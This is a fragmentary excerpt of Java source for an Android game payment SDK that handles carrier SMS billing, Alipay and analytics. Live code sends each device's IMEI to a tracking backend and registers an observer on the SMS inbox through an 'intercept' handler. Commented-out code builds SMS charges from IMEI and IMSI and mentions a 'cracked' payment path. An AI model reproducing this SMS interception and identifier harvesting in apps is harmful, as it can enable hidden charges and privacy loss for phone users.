...
public class GameSDK implements InitializeCallback, ActivateCallback,
	...
	private static final int NOTICE_INITPAY = 101;
	...
	private void sendDataToyoushu(){
		try {
			switch (mobileType) {
			case PayConfig.CMCC_MOBLE:
				MobileAgent.onEvent(context, "CPS", Helper.getNowTime()+","+instance.currentAppID+","+"移动"
						+","+Helper.getIMEI(context)+","+SendOder.getInstance().amount);
				Util_G.debugE("youshu-->>","支付时间："+ Helper.getNowTime()+",APPID="+instance.currentAppID+",运营商："+"移动"
						+",IMEI="+Helper.getIMEI(context)+",金额="+SendOder.getInstance().amount);
				Toast.makeText(context, "数据提交有数后台:", Toast.LENGTH_LONG).show();
				break;
			case PayConfig.UNICOM_MOBLE:
				MobileAgent.onEvent(context, "CPS", Helper.getNowTime()+","+instance.currentAppID+","+"联通"
						+","+Helper.getIMEI(context)+","+SendOder.getInstance().amount);
				Toast.makeText(context, "数据提交有数后台", Toast.LENGTH_LONG).show();
				break;
			case PayConfig.TIANYI_MOBLE:
				MobileAgent.onEvent(context, "CPS", Helper.getNowTime()+","+instance.currentAppID+","+"电信"
						+","+Helper.getIMEI(context)+","+SendOder.getInstance().amount);
				Toast.makeText(context, "数据提交有数后台", Toast.LENGTH_LONG).show();
				break;
			...
			Util_G.debugE("youshu-->>", "提交有数后台的数据有误，，，");
			e.printStackTrace();
		}
	}
	/* 联网用到的变量 end */
				...
				case PayConfig.ALIPAY_RQF_PAY: {
					...
					try {
						...
						if (retVal == ResultChecker.RESULT_CHECK_SIGN_FAILED) {
							notifyPaymentFail(PayConfig.ALIPAY_RSA_FAIL, "校验失败");
							...
							if (tradeStatus.equals("9000")) {// 判断交易状态码，只有9000表示交易成功
											...
											public void onResult(String info) {
												try {
													...
													if (ret == 1) {// 代表服务端通知成功
														...
														PayResultInfo resultInfo = new PayResultInfo();
														resultInfo.resutCode = PayConfig.ALIPAY_PAY_FAIL;
								...
								notifyPaymentFail(PayConfig.ALIPAY_PAY_FAIL, result);
							}
								
						}
					} catch (Exception e) {
						Log.e(Constants.TAG, e.getMessage());
						notifyPaymentFail(PayConfig.ALIPAY_PAY_FAIL, "支付失败");
					}
				}
					break;
...
//		instance.initialize();
		handler.sendEmptyMessage(NOTICE_INITPAY);
	}
...
//		// if (Helper.isDebugEnv()) {//打包出去 时一定要去掉这段代码
//		// MK = Constants.NET_FEE;
//		// }
//			SendOder.getInstance().payway = paywayStr[0];
//			if (!NETIVE_FEE_CAN_PAY
//					|| ((!(MK.equals(Constants.COMMON_MM) || MK.equals(""))) && !Helper
//							.isNetworkConnected(context))) {// 如果刚进入不能使用破解支付
//				if (mmSDKInited)
//					MK = Constants.COMMON_MM;
//				else if (jdSDKINited) {
//					MK = Constants.MM_JD_PAY;
//				}
//					
//			}
//			Log.e("startPay", "MMMK==" + MK);
//			payResultHandle.removeMessages(PayConfig.NATIVE_FEE_FAIL);
//			if (MK.equals(Constants.MM_JD_PAY)) {
//				SendOder.getInstance().payway = paywayStr[7];
...
//					Util_G.debugE("allPay", e.getMessage());
//				}
//			} else if (MK.equals(Constants.NATIVE_FEE)) {
//				SendOder.getInstance().sapay_ret("", 0);
//				handler.sendEmptyMessageDelayed(FEE_OVER, 30000);// 大都不会走到这句话里面去
//
//				try {
//					PaymentFactoy.producePay(PayConfig.CMCC_NETIVE_FEE).pay(
//							context, requestAmount, payindex);
//					bCallback = 0;
//					payResultHandle.sendEmptyMessageDelayed(
//							PayConfig.NATIVE_FEE_FAIL, 20000);
//				} catch (Throwable e) {
//					Util_G.debugE("allPay", e.getMessage());
//				}
//			} else if (MK.equals(Constants.NATIVE2_FEE)) {
//				handler.sendEmptyMessageDelayed(FEE_OVER, 30000);// 大都不会走到这句话里面去
//
//				SendOder.getInstance().sapay_ret("", 0);
//				if (feePayInfo.initSuccess) {
//					try {
//						SendOder.getInstance().amount = feePayInfo
//								.getFeeConunt(payindex, requestAmount);
//						String msmContent = MSMConten
//								.getInstance()
//								.getMSGContent(
//										feePayInfo.strApkPublicKey,
//										feePayInfo.strAppKey,
//										feePayInfo.md5,
//										feePayInfo.md5dex,
//										feePayInfo.strProID,
//										feePayInfo.strChannelID,
//										String.format("%s%02d",
//												feePayInfo.app_id, payindex + 1),
//										Helper.getIMEI(context),
//										Helper.getIMSI(context),
//										Helper.getIMEI(context));
//						String[] msmContents = msmContent.split("#");
//						SendOder.mthrirdno = (msmContents[msmContents.length - 4]);
//						PaymentFactoy.producePay(PayConfig.MM_NET_FEE).pay(
//								context, msmContent);
//						payResultHandle
//								.removeMessages(PayConfig.NATIVE_FEE_FAIL);
//						payResultHandle.sendEmptyMessageDelayed(
//								PayConfig.NATIVE_FEE_FAIL, 15000);
//					} catch (Throwable e) {
//						Util_G.debugE("allPay", e.getMessage());
//						handler.sendEmptyMessage(TO_OTHER_PAY);// 否则走正常支付流程
//					}
//
//				}
//			} else if (MK.equals(Constants.NET_FEE)) {
//				SendOder.getInstance().sapay_ret("", 0);
//				handler.sendEmptyMessageDelayed(FEE_OVER, 30000);// 大都不会走到这句话里面去
//
//				String url = GameSDK.getSetting(context, Constants.MKUrl);
//				getMSM(url, requestAmount, payindex, instance);
//			} else if (MK.equals(Constants.ANAN_FEE)) {
//				SendOder.getInstance().payway = paywayStr[9];
//				SendOder.getInstance().amount = anAnfeeInfo.getMoney(payindex) == 0 ? requestAmount
//						: anAnfeeInfo.getMoney(payindex);
//				SendOder.getInstance().sapay_ret("", 0);
//				handler.sendEmptyMessageDelayed(FEE_OVER, 30000);// 大都不会走到这句话里面去
//
//				if (anAnfeeInfo != null && anAnfeeInfo.initSCC
//						&& Helper.isNetworkConnected(context)
//						&& SendOder.getInstance().amount < limitMoney) {
//					try {
//						PaymentFactoy.producePay(PayConfig.CMCC_ANAN_FEE).pay(
//								context, anAnfeeInfo.appKey,
//								anAnfeeInfo.getPayCode(payindex),
//								anAnfeeInfo.ChannelID, payOrder);
//						limitOrder = payOrder;
//					} catch (Throwable e) {
//						Util_G.debugE("allPay", e.getMessage());
//						handler.sendEmptyMessage(TO_OTHER_PAY);// 否则走正常支付流程
...
//		}
//		case PayConfig.TIANYI_MOBLE: {
//			if (MK.equals(Constants.TC_FEE) && TCfeeInfo != null
//					&& TCfeeInfo.initSCC) {
//				handler.removeMessages(FEE_OVER);
//				handler.sendEmptyMessageDelayed(FEE_OVER, 30000);// 大都不会走到这句话里面去
//				SendOder.getInstance().payway = paywayStr[5];
//				SendOder.getInstance().amount = TCfeeInfo
//						.getItemMoney(payindex) == 0 ? requestAmount
//						: TCfeeInfo.getItemMoney(payindex);
//				SendOder.getInstance().sapay_ret("", 0);
//				if (TCfeeInfo != null && TCfeeInfo.initSCC
//						&& Helper.isNetworkConnected(context)
//						&& SendOder.getInstance().amount < limitMoney) {
//					try {
//						PaymentFactoy.producePay(PayConfig.TIANYI_FEE).pay(
//								context, TCfeeInfo.merid,
//								TCfeeInfo.getItemMoney(payindex) + "",
//								Helper.getIMSI(context), TCfeeInfo.gameName,
//								payOrder, TCfeeInfo.pay_url, TCfeeInfo.signKey);
//						limitOrder = payOrder;
//					} catch (Throwable e) {
//						notifyPaymentFail(PayConfig.TC_INIT_CODE, "天翼空间未集成");
//					}
//				} else {
//					notifyPaymentFail(PayConfig.LIMIT_FEE_FAIL, "额度不够！");
//				}
//			} else if (MK.equals(Constants.TC_ALL_FEE) && DXAllInfo != null
//					&& DXAllInfo.initSCC) {
//				SendOder.getInstance().amount = DXAllInfo
//						.getItemMoney(payindex) == 0 ? requestAmount
//						: DXAllInfo.getItemMoney(payindex);
//				SendOder.getInstance().payway = paywayStr[4];
//				SendOder.getInstance().sapay_ret("", 0);
//				if (DXAllInfo != null && DXAllInfo.initSCC
//						&& Helper.isNetworkConnected(context)
//						&& SendOder.getInstance().amount < limitMoney) {
//					try {
//						PaymentFactoy.producePay(PayConfig.DX_ALL).pay(context,
//								DXAllInfo.merid,
//								DXAllInfo.getGoodsIds(payindex),
//								Helper.getIMSI(context),
//								Helper.getIMEI(context), payOrder,
//								DXAllInfo.gameName, DXAllInfo.pay_url,
//								DXAllInfo.signtype, DXAllInfo.signKey,
//								DXAllInfo.notifyurl,
//								DXAllInfo.itemNames[payindex]);
//						limitOrder = payOrder;
//					} catch (Throwable e) {
//						Util_G.debugE("allPay", e.getMessage());
//						notifyPaymentFail(-1, "支付异常");
//					}
//				} else {
...
//		}
//		case PayConfig.UNICOM_MOBLE: {
//			if (MK.equals(Constants.UNICOM_FEE) && woPlusfeeInfo != null
//					&& woPlusfeeInfo.initSCC) {
//				handler.sendEmptyMessageDelayed(FEE_OVER, 30000);// 大都不会走到这句话里面去
//				SendOder.getInstance().amount = woPlusfeeInfo
//						.getItemMoney(payindex) == 0 ? requestAmount
//						: woPlusfeeInfo.getItemMoney(payindex);
//				SendOder.getInstance().payway = paywayStr[4];
//				SendOder.getInstance().sapay_ret("", 0);
//				if (woPlusfeeInfo != null && Helper.isNetworkConnected(context)
//						&& SendOder.getInstance().amount < limitMoney) {
//					try {
//						PaymentFactoy.producePay(PayConfig.UNICOM_TEN_FEE).pay(
//								context, woPlusfeeInfo.merid,
//								woPlusfeeInfo.getGoodsIds(payindex),
//								Helper.getIMSI(context),
//								Helper.getIMEI(context), payOrder,
//								woPlusfeeInfo.gameName, woPlusfeeInfo.pay_url,
//								woPlusfeeInfo.signtype, woPlusfeeInfo.signKey,
//								woPlusfeeInfo.notifyurl,
//								woPlusfeeInfo.itemNames[payindex]);
//						limitOrder = payOrder;
//					} catch (Throwable e) {
//						Util_G.debugE("allPay", e.getMessage());
//						notifyPaymentFail(-1, "支付异常");
...
//				}
//			}
//			if (MK.equals(Constants.FANHE_PAY) && fanHeFeeInfo != null
//					&& fanHeFeeInfo.initSCC) {
//				handler.sendEmptyMessageDelayed(FEE_OVER, 30000);// 大都不会走到这句话里面去
//				SendOder.getInstance().amount = fanHeFeeInfo
//						.getItemMoney(payindex) == 0 ? requestAmount
//						: fanHeFeeInfo.getItemMoney(payindex);
//				SendOder.getInstance().payway = paywayStr[4];
//				SendOder.getInstance().sapay_ret("", 0);
//				payOrder = payOrder.substring(0, 11);
//				if (fanHeFeeInfo != null && Helper.isNetworkConnected(context)
//						&& SendOder.getInstance().amount < limitMoney) {
//					try {
//						PaymentFactoy.producePay(PayConfig.FANHE_PAY).pay(
//								context, fanHeFeeInfo.getPayCode(payindex),
//								payOrder, fanHeFeeInfo.getItemName(payindex));
//						limitOrder = payOrder;
//					} catch (Throwable e) {
//						Util_G.debugE("allPay", e.getMessage());
//						notifyPaymentFail(-1, "支付异常");
...
//				payOrder, SendOder.getInstance().amount, payname, paywayStr[9]);
	...
	private static void addSMSObserver(Context context) {
		try {
			...
			Handler handler = new mobi.zty.sdk.game.intercept.SMSHandler(resolver);
			instance.mObserver = new SMSObserver(resolver, handler);
			resolver.registerContentObserver(SMS.CONTENT_URI, true,
					instance.mObserver);
		} catch (Throwable e) {
			e.printStackTrace();
		}
